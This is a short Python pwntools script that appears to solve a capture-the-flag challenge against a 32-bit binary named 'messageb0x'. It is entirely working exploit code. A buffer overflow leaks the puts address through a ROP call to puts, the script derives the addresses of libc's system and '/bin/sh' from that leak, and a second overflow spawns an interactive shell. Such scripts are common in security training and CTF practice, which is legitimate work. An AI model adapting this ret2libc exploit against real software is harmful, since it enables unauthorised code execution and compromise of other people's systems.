#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
 
cn = process('./messageb0x')
bin = ELF('./messageb0x')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
     
def z(a=''):
    gdb.attach(cn,a)
    if a == '':
        raw_input()
 
retn_addr=0x080490c0
cn.recvuntil('are:')
cn.sendline('')
#z('b *0x08049303')
#z('b *0x080492E2\n'+'b *0x08049315')
cn.recvuntil('address:')
cn.sendline('')
cn.recvuntil('to say:')
payload=(0x58+0x04)*'a'
payload+=p32(bin.plt['puts'])+p32(retn_addr)+p32(bin.got['puts'])
cn.sendline(payload)
#print(hex(puts_plt))
cn.recvuntil('--> Thank you !\n')
puts_addr=u32(cn.recv(4))
#puts_addr=u32(cn.recvuntil('\xf7')[-8:])
print(hex(puts_addr))
offset=libc.symbols['puts']-puts_addr
system_addr=libc.symbols['system']-offset
bin_addr=libc.search('/bin/sh').next()-offset
print(hex(system_addr))
print(hex(bin_addr))
cn.recvuntil('are:')
cn.sendline('')
cn.recvuntil('address:')
cn.sendline('')
cn.recvuntil('say:')
payload=(0x58+0x04)*'a'
payload+=p32(system_addr)+'aaaa'+p32(bin_addr)
cn.sendline(payload)
cn.interactive()
